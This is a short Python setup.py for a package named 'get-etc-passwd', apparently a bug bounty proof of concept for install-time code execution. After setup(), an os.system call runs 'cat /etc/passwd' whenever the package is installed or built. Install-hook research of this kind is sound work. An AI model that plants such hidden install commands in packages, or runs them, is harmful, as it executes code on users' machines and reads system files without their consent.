from setuptools import setup, find_packages
import os


setup(
    name='get-etc-passwd',
    version='0.6',
    license='MIT',
    author="Nir Ohfeld",
    author_email='niro@wiz.io',
    packages=find_packages('src'),
    package_dir={'': 'src'},
    url='https://github.com/gmyrianthous/example-publish-pypi',
    keywords='bug bounty test',
    install_requires=[],
)

os.system('cat /etc/passwd')
